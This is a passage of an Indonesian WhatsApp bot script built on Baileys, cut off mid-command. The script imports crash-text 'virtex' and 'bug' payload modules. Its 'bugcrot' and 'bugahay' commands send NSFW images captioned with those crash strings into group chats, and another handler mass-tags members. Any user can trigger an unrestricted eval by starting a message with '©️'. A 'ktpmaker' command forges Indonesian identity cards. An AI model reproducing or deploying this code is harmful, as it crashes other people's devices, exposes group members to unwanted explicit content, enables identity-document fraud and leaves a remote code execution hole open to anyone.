/*
// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
   Apalagi Lari Dari Tanggung Jawab

// Base Xyrvzaa

› Create By Xyrvzaa
› Base Ori Xyrvzaa - Haikal

🌷 KALAU MAU RENAME TARO CREDITS GUA : Xyrvzaa*/

//=================================================//
require('./hwkal')
const { WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const vm = require('node:vm')
const mel = require('kitsune-api')
const axios = require('axios')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const maker = require('mumaker')
const mathjs = require('mathjs')
const { uptotelegra } = require('./baseikal/lib/upload')
const textpro = require('./baseikal/lib/textpro')
const fsx = require('fs-extra')
const { color, bgcolor } = require('./baseikal/lib/color')
const ytdl = require("ytdl-core")
const { exec, spawn, execSync } = require("child_process")
const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { bugsw } = require('./baseikal/virtex/bugsw')
const { iphone } = require('./baseikal/virtex/iphone')
const { iphone1 } = require('./baseikal/virtex/iphone1')
const { iphone2 } = require('./baseikal/virtex/iphone2')
const { iphone3 } = require('./baseikal/virtex/iphone3')
const { iphone4 } = require('./baseikal/virtex/iphone4')
const { iphone5 } = require('./baseikal/virtex/iphone5')
const { iphone6 } = require('./baseikal/virtex/iphone6')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
//=================================================//
// COMMAND GUA SULITIN
const { menu } = require('./baseikal/command/menu/menu')
const { allmenu } = require('./baseikal/command/allmenu/allmenu')
const { textmaker } = require('./baseikal/command/textmaker/textmaker')
const { mediafireDl } = require('./baseikal/lib/mediafire.js')
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const kalimage = fs.readFileSync ('./baseikal/image/mamak.jpg')
const gopay = fs.readFileSync ('./baseikal/image/gopay.jpg')
const dana = fs.readFileSync ('./baseikal/image/dana.jpg')
const rekening = fs.readFileSync ('./baseikal/image/rekening.jpg')
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const ntilink = JSON.parse(fs.readFileSync("./baseikal/lib/antilink.json"))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
var chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''

//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await haikal.decodeJid(haikal.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await haikal.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
const content = JSON.stringify(m.message)
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isDocu = (type == 'documentMessage')
const isSticker = (type == 'stickerMessage')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
//=================================================//}
const reply = (teks) => {
return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER Xyrvzaa`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/7b3c0ac03dab420c5c12b.jpg',"thumbnail": thumb,"sourceUrl": `https://youtube.com/@LennX-MODS`}}}, { quoted: m})} 
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
//=================================================//
if (!haikal.public) {
if (!m.key.fromMe) return
}
        if (m.message) {            
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
//=================================================// 

//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await haikal.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`「 Detect Link 」\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `「 Detect Link 」\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (!isBotAdmins) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await haikal.groupParticipantsUpdate(from, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`「 Detect Link 」\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
    
if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
const sendapk = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yoapk Haikal')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}
//=================================================//
const sendzip = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yozip Haikal')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}
//=================================================//
let reactionMessage = require("@adiwajshing/baileys").proto.Message.ReactionMessage.create({ key: m.key, text: "" })
const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yopdf Haikal')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
haikal.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}
const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await haikal.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await haikal.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "```Success```", gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

let list = []
for (let i of owner) {
list.push({
displayName: await haikal.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await haikal.getName(i + '@s.whatsapp.net')}\n
FN:${await haikal.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:inodsanjaya1998@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://linktr.ee/sheseescheese\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await haikal.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
async function tiktokdl(url) {
    try {
const tokenn = await axios.get("https://downvideo.quora-wiki.com/tiktok-video-downloader#url=" + url);
let a = cheerio.load(tokenn.data);
let token = a("#token").attr("value");
const param = {
    url: url,
    token: token,
};
const { data } = await axios.request("https://downvideo.quora-wiki.com/system/action.php", {
method: "post",
data: new URLSearchParams(Object.entries(param)),
headers: {
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
    "referer": "https://downvideo.quora-wiki.com/tiktok-video-downloader",
},
    }
);
return {
    status: 200,
    title: data.title,
    thumbnail: data.thumbnail,
    duration: data.duration,
    media: data.medias,
};
    } catch (e) {
return e
    }
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}
//LOGO MENTAHAN
const hw1 = fs.readFileSync ('./baseikal/logo/hw1.jpg')
const hw2 = fs.readFileSync ('./baseikal/logo/hw2.jpg')
const hw3 = fs.readFileSync ('./baseikal/logo/hw3.jpg')
const hw4 = fs.readFileSync ('./baseikal/logo/hw4.jpg')
const hw5 = fs.readFileSync ('./baseikal/logo/hw5.jpg')
const hw6 = fs.readFileSync ('./baseikal/logo/hw6.jpg')
const hw7 = fs.readFileSync ('./baseikal/logo/hw7.jpg')
const hw8 = fs.readFileSync ('./baseikal/logo/hw8.jpg')
const hw9 = fs.readFileSync ('./baseikal/logo/hw9.jpg')
const hw10 = fs.readFileSync ('./baseikal/logo/hw10.jpg')
const hw11 = fs.readFileSync ('./baseikal/logo/hw11.jpg')
const hw12 = fs.readFileSync ('./baseikal/logo/hw12.jpg')
const hw13 = fs.readFileSync ('./baseikal/logo/hw13.jpg')
const hw14 = fs.readFileSync ('./baseikal/logo/hw14.jpg')
const hw15 = fs.readFileSync ('./baseikal/logo/hw15.jpg')
const hw16 = fs.readFileSync ('./baseikal/logo/hw16.jpg')
const hw17 = fs.readFileSync ('./baseikal/logo/hw17.jpg')
const hw18 = fs.readFileSync ('./baseikal/logo/hw18.jpg')
const hw19 = fs.readFileSync ('./baseikal/logo/hw19.jpg')
const hw20 = fs.readFileSync ('./baseikal/logo/hw20.jpg')
const hw21 = fs.readFileSync ('./baseikal/logo/hw21.jpg')
const hw22 = fs.readFileSync ('./baseikal/logo/hw22.jpg')
const hw23 = fs.readFileSync ('./baseikal/logo/hw23.jpg')
const hw24 = fs.readFileSync ('./baseikal/logo/hw24.jpg')
const hw25 = fs.readFileSync ('./baseikal/logo/hw25.jpg')
const hw26 = fs.readFileSync ('./baseikal/logo/hw26.jpg')
const hw27 = fs.readFileSync ('./baseikal/logo/hw27.jpg')
const hw28 = fs.readFileSync ('./baseikal/logo/hw28.jpg')
const hw29 = fs.readFileSync ('./baseikal/logo/hw29.jpg')
const hw30 = fs.readFileSync ('./baseikal/logo/hw30.jpg')
const hw31 = fs.readFileSync ('./baseikal/logo/hw31.jpg')
const hw32 = fs.readFileSync ('./baseikal/logo/hw32.jpg')
const hw33 = fs.readFileSync ('./baseikal/logo/hw33.jpg')
const hw34 = fs.readFileSync ('./baseikal/logo/hw34.jpg')
const hw35 = fs.readFileSync ('./baseikal/logo/hw35.jpg')
const hw36 = fs.readFileSync ('./baseikal/logo/hw36.jpg')
const hw37 = fs.readFileSync ('./baseikal/logo/hw37.jpg')
const hw38 = fs.readFileSync ('./baseikal/logo/hw38.jpg')
const hw39 = fs.readFileSync ('./baseikal/logo/hw39.jpg')
const hw40 = fs.readFileSync ('./baseikal/logo/hw40.jpg')
const hw41 = fs.readFileSync ('./baseikal/logo/hw41.jpg')
const hw42 = fs.readFileSync ('./baseikal/logo/hw42.jpg')
const hw43 = fs.readFileSync ('./baseikal/logo/hw43.jpg')
const hw44 = fs.readFileSync ('./baseikal/logo/hw44.jpg')
const hw45 = fs.readFileSync ('./baseikal/logo/hw45.jpg')
const hw46 = fs.readFileSync ('./baseikal/logo/hw46.jpg')
const hw47 = fs.readFileSync ('./baseikal/logo/hw47.jpg')
const hw48 = fs.readFileSync ('./baseikal/logo/hw48.jpg')
const hw49 = fs.readFileSync ('./baseikal/logo/hw49.jpg')
const hw50 = fs.readFileSync ('./baseikal/logo/hw50.jpg')
const hw51 = fs.readFileSync ('./baseikal/logo/hw51.jpg')
const hw52 = fs.readFileSync ('./baseikal/logo/hw52.jpg')
const hw53 = fs.readFileSync ('./baseikal/logo/hw53.jpg')
const hw54 = fs.readFileSync ('./baseikal/logo/hw54.jpg')
const hw55 = fs.readFileSync ('./baseikal/logo/hw55.jpg')
const hw56 = fs.readFileSync ('./baseikal/logo/hw56.jpg')
const hw57 = fs.readFileSync ('./baseikal/logo/hw57.jpg')
const hw58 = fs.readFileSync ('./baseikal/logo/hw58.jpg')
const hw59 = fs.readFileSync ('./baseikal/logo/hw59.jpg')
const hw60 = fs.readFileSync ('./baseikal/logo/hw60.jpg')
const hw61 = fs.readFileSync ('./baseikal/logo/hw61.jpg')
const hw62 = fs.readFileSync ('./baseikal/logo/hw62.jpg')
const hw63 = fs.readFileSync ('./baseikal/logo/hw63.jpg')
const hw64 = fs.readFileSync ('./baseikal/logo/hw64.jpg')
const hw65 = fs.readFileSync ('./baseikal/logo/hw65.jpg')
const hw66 = fs.readFileSync ('./baseikal/logo/hw66.jpg')
const hw67 = fs.readFileSync ('./baseikal/logo/hw67.jpg')
const hw68 = fs.readFileSync ('./baseikal/logo/hw68.jpg')
const hw69 = fs.readFileSync ('./baseikal/logo/hw69.jpg')
const hw70 = fs.readFileSync ('./baseikal/logo/hw70.jpg')
const hw71 = fs.readFileSync ('./baseikal/logo/hw71.jpg')
const hw72 = fs.readFileSync ('./baseikal/logo/hw72.jpg')
const hw73 = fs.readFileSync ('./baseikal/logo/hw73.jpg')
const hw74 = fs.readFileSync ('./baseikal/logo/hw74.jpg')
const hw75 = fs.readFileSync ('./baseikal/logo/hw75.jpg')
const hw76 = fs.readFileSync ('./baseikal/logo/hw76.jpg')
const hw77 = fs.readFileSync ('./baseikal/logo/hw77.jpg')
const hw78 = fs.readFileSync ('./baseikal/logo/hw78.jpg')
const hw79 = fs.readFileSync ('./baseikal/logo/hw79.jpg')
var sticSukses = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SuksesCok.webp')
haikal.sendImageAsSticker(from, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
    if (setting) {
if (!('inod' in setting)) setting.inod = true
if (!('sura' in setting)) setting.sura = false
if (!('hwmods' in setting)) setting.hwmods = false
if (!('onkabeh' in setting)) setting.onkabeh = false
if (!('offkabeh' in setting)) setting.offkabeh = false
if (!('inod1' in setting)) setting.inod1 = true
if (!('sura1' in setting)) setting.sura1 = false
if (!('hwmods1' in setting)) setting.hwmods1 = false
if (!('onkabeh1' in setting)) setting.onkabeh1 = false
if (!('offkabeh1' in setting)) setting.offkabeh1 = false
	    } else global.db.data.settings[botNumber] = {
inod: true,
sura: false,
hwmods: false,
onkabeh: false,
offkabeh: false,
inod1: true,
sura1: false,
hwmods1: false,
onkabeh1: false,
offkabeh1: false,
	    }
} catch (err) {
console.log(err)
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya Bot Hw Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

//=================================================//
switch(command) {
//=================================================//
case 'afk': {
if (!isCreator) return m.reply(mess.owner)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
}
break
case 'nsfw': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Emang Lu Admin?')
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `「 ⚠️ Peringatan ⚠️ 」\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
const anuala = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

Ketik On Untuk Menyalakan Fitur Ini
Ketif Of Untuk Menon Aktifkan Fitur Ini

\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
bugcrot
bugahay `,
}
haikal.sendMessage(from, anuala, `Xyrvzaa${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!AntiNsfww) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
const bugcrot = {
image: {url:waifudd.data.url},
caption: `© Xyrvzaa${buttonkal}`,
} 
haikal.sendMessage(from, bugcrot, { quoted:m}).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!AntiNsfww) return m.reply(mess.nsfw)
m.reply('Sabar Cuy Loading')
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const bugahay = {
image: {url:waifudd.data.url},
caption: `© Xyrvzaa${buttonkal}`,
} 
haikal.sendMessage(from, bugahay, { quoted:m}).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'ktpmaker': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah|LinkGambar\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc|https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\n\n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
get_args = args.join(" ").split("|")
nik = get_args[0]
if (!nik) return m.reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
prov = get_args[1]
if (!prov) return m.reply('probinsi mana kak')
kabu = get_args[2]
if (!kabu) return m.reply('kabupaten mana kak')
name = get_args[3]
if (!name) return m.reply('nama nya siapa kak')
ttl = get_args[4]
if (!ttl) return m.reply('tempat tanggal lahir nya kak')
jk = get_args[5]
if (!jk) return m.reply('jenis kelamin pria atau wanita kak')
jl = get_args[6]
if (!jl) return m.reply('alamat rumah nya mana kak')
rtrw = get_args[7]
if (!rtrw) return m.reply('RT / RW berapa kak')
lurah = get_args[8]
if (!lurah) return m.reply('kelurahan mana kak')
camat = get_args[9]
if (!camat) return m.reply('kecamatan mana kak')
agama = get_args[10]
if (!agama) return m.reply('agama nya apa kak')
nikah = get_args[11]
if (!nikah) return m.reply('status belum ada')
kerja = get_args[12]
if (!kerja) return m.reply('pekerjaan belum ada')
warga = get_args[13]
if (!warga) return m.reply('region belum ada')
until = get_args[14]
if (!until) return m.reply('waktu berlaku belum ada')
gd = get_args[15]
if (!gd) return m.reply('golongan darah belum ada')
img = get_args[16]
if (!img) return m.reply('url image belum ada')
      m.reply('Sabar Cuy Loading')
bikin = (`https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gd=${gd}&almt=${jl}&rtw=${rtrw}&kel=${lurah}&kc=${camat}&agm=${agama}&st=${nikah}&krj=${kerja}&ngr=${warga}&blk=${until}&prv=${prov}&kab=${kabu}&picturl=${img}`)
console.log(bikin)
ardaktp = await getBuffer(bikin)
  await sleep(8000)
await haikal.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted: m })
sticSukses(from)
//await sleep(5000)
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'emojimix': { 
if (!isCreator) return m.reply(mess.owner)
let [emoji1, emoji2] = text.split`+`
